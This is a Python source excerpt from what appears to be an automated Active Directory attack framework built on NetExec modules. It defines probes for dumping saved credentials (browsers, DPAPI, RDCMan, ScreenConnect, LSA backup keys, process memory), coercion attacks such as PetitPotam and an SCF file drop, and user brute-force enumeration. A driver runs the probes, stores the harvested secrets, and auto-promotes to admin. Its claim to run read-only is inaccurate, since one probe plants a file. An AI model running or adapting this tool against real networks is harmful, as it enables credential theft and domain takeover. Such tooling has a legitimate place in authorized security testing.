    Probe("dpapi_ng", "DPAPI-NG decrypt (LAPS v2 / KeyCreds / Chromium v20+)",
          "smb", ("-M", "dpapi-ng",), requires_admin=True),
    Probe("rdcman", "Remote Desktop Connection Manager saved credentials",
          "smb", ("-M", "rdcman",), requires_admin=True),
    Probe("enum_dns", "AD-integrated DNS zone enumeration (asset mapping)",
          "ldap", ("-M", "enum_dns",)),
    # axis 2 slice 5 — remaining credential probes + findings + asset-enum
    Probe("drop_sc", "ScreenConnect config dump (cached server credentials)",
          "smb", ("-M", "drop-sc",), requires_admin=True),
    Probe("scuffy", "SCF file UNC coerce (persistence drop)",
          "smb", ("-M", "scuffy",)),
    Probe("spooler", "Print Spooler service enumeration (feeds PrinterBug)",
          "smb", ("-M", "spooler",)),
    Probe("ldap_checker", "LDAP signing + channel-binding posture",
          "ldap", ("-M", "ldap-checker",)),
    Probe("obsolete_nt_hash_users", "accounts with pre-2004 NT hashes (cracks fast)",
          "ldap", ("-M", "obsolete_nt_hash_users",)),
    Probe("pre2k", "pre-2000 compat computer accounts (password == hostname)",
          "ldap", ("-M", "pre2k",)),
    Probe("get_network", "AD Sites + Subnets objects (internal network map)",
          "ldap", ("-M", "get-network",)),
    Probe("groupmembership", "membership enumeration of a target group",
          "ldap", ("-M", "groupmembership",)),
    Probe("rid_brute", "SAMR RID-space brute (user/group enum when LDAP is restricted)",
          "smb", ("--rid-brute",)),
    Probe("users_computers", "systematic AD user + computer snapshot",
          "ldap", ("--users", "--computers")),
)


PARSERS = {
    "shares": lambda t: ProbeResult(ok=True, findings=parse_shares(t), raw_output=t),
    "loggedon_users": lambda t: ProbeResult(
        ok=True, findings=parse_loggedon_users(t), raw_output=t),
    "sessions": lambda t: ProbeResult(
        ok=True, findings=parse_sessions(t), raw_output=t),
    "laps": parse_laps,
    "gpp_password": parse_gpp,
    "veeam": parse_veeam,
    "teams_localdb": parse_teams,
    "nanodump": parse_nanodump,
    "ms17_010": parse_ms17_010,
    "coerce_plus": parse_coerce_plus,
    "laps_v2": parse_laps_v2,
    "gpp_autologin": parse_gpp_autologin,
    "chrome": parse_chrome,
    "firefox": parse_firefox,
    "keepass_discover": parse_keepass_discover,
    "masky": parse_masky,
    "shadowcredentials": parse_shadowcredentials,
    "petitpotam": parse_petitpotam,
    "nopac": parse_nopac,
    "lsa_backup_keys": parse_lsa_backup_keys,
    "dpapi_ng": parse_dpapi_ng,
    "rdcman": parse_rdcman,
    "enum_dns": parse_enum_dns,
    "drop_sc": parse_drop_sc,
    "scuffy": parse_scuffy,
    "spooler": parse_spooler,
    "ldap_checker": parse_ldap_checker,
    "obsolete_nt_hash_users": parse_obsolete_nt_hash_users,
    "pre2k": parse_pre2k,
    "get_network": parse_get_network,
    "groupmembership": parse_groupmembership,
    "rid_brute": parse_rid_brute,
    "users_computers": parse_users_computers,
}


# ------------------------------------------------------------- driver

@dataclass
class ProbeRunReport:
    ran: list = field(default_factory=list)          # [(probe_key, ProbeResult)]
    skipped: list = field(default_factory=list)      # [(probe_key, reason)]
    promoted_admin: bool = False                     # a probe inferred admin access


#: Share names that, when the authenticating credential can WRITE to all of them,
#: indicate domain-controller admin — nxc's ``(Pwn3d!)`` marker is C$-based and misses
#: DCs that don't advertise C$ (Samba, some lab builds). Lower-cased for matching.
_DC_ADMIN_SHARES = frozenset({"sysvol", "netlogon"})


def _is_dc_admin_by_shares(share_findings):
    """SYSVOL + NETLOGON both writable → effectively DC admin, promote the access."""
    writable = set()
    for f in share_findings:
        if f.kind != "smb_share" or "WRITE" not in f.title.upper():
            continue
        m = re.search(r"'([^']+)'", f.title)
        if m:
            writable.add(m.group(1).lower())
    return _DC_ADMIN_SHARES.issubset(writable)


def run_probes(store, host, cred_row, *, is_admin=False, run=None, on_event=None,
               probes=PROBES, timeout=120):
    """Run each ``PROBES`` entry against ``host`` as ``cred_row``, capturing output as
    a step + folding recognized facts into findings/credentials.

    Skips admin-only probes when ``is_admin`` is False so a low-priv foothold doesn't
    hammer LAPS/logged-on-users pointlessly. Runs read-only.
    """
    run = run or (lambda argv, env=None:
                  runner_mod.run(argv, env_add=env, timeout=timeout))
    cred = Credential.from_row(cred_row)
    report = ProbeRunReport()
    promoted_admin = False
    for probe in probes:
        if probe.requires_admin and not is_admin:
            report.skipped.append((probe.key, "requires admin"))
            continue
        rendered = render_nxc(cred, probe.proto, target=host["ip"],
                              extra=list(probe.extra))
        res = run(rendered.argv, rendered.env)
        if on_event:
            on_event(f"  [nxc:{probe.key}] {host['ip']}: "
                     f"{shlex.join(list(probe.extra))}")
        if not res.ok:
            report.skipped.append((probe.key, res.error or "tool run failed"))
            continue
        text = res.output or ""
        parser = PARSERS.get(probe.key, lambda t: ProbeResult(ok=True, raw_output=t))
        parsed = parser(text)
        with store.transaction():
            # Capture the probe as a step row for the report + evidence trail;
            # the id isn't threaded onto the findings (per-probe findings have
            # their own asset_id/host_id scoping) so we don't bind the return.
            store.add_step(
                cmd=f"nxc {probe.proto} {host['ip']} {' '.join(probe.extra)}",
                output=text, exit_code=res.exit_code, host_id=host["id"],
                transport=f"nxc-probe:{probe.key}")
            for f in parsed.findings:
                store.add_finding(host_id=host["id"], vector_type=f.kind,
                                  title=f.title, evidence=f.evidence,
                                  severity=f.severity, proven=True)
            for c in parsed.credentials:
                cred_obj = Credential(username=c.username, secret=c.secret,
                                      secret_type=c.secret_type, domain=c.domain)
                store.add_credential(cred_obj, source=c.source)
            # Samba DCs don't advertise C$, so nxc's ``(Pwn3d!)`` admin oracle misses
            # them. Writable SYSVOL + NETLOGON is a strong second signal: that pair
            # of shares is only writable by domain admins (replication requires it).
            # Promote the SMB access row to admin when we see both — the credential
            # loop can then run `mssql escalate` and other admin-gated commands.
            if not is_admin and probe.key == "shares" and _is_dc_admin_by_shares(
                    parsed.findings):
                store.add_access(host["id"], cred_row["id"], method="smb", admin=True)
                promoted_admin = True
                if on_event:
                    on_event(f"  [nxc:shares] {host['ip']}: "
                             "SYSVOL+NETLOGON both writable → promoting to admin "
                             "(nxc missed the Pwn3d! marker — likely a non-C$ DC)")
        report.ran.append((probe.key, parsed))
    report.promoted_admin = promoted_admin
    return report
